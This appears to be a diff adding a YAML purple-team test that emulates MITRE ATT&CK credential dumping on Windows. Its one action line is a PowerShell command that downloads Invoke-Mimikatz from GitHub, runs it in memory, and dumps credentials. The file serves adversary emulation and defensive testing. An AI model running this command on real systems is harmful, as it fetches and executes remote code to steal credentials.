@@ -1,0 +1,16 @@
+enabled: FALSE untested
+meta:
+  author: redcanary
+  created: 2017-11-05
+  decorations:
+  - Purple Team
+  description: Windows dump cres with powershell mimikatz.
+  link: https://github.com/gentilkiwi/mimikatz
+  mitre_link: https://attack.mitre.org/wiki/Technique/T1003
+  mitre_attack_phase: Credential Access
+  mitre_attack_technique: Credential Dumping
+  purple_actions:
+    1: cmd.exe /c powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds\"
+os: windows
+name: Windows dump cres with powershell mimikatz.
+uuid: c7ad9fd9-e33b-4daf-bc56-eeed43dbec0c
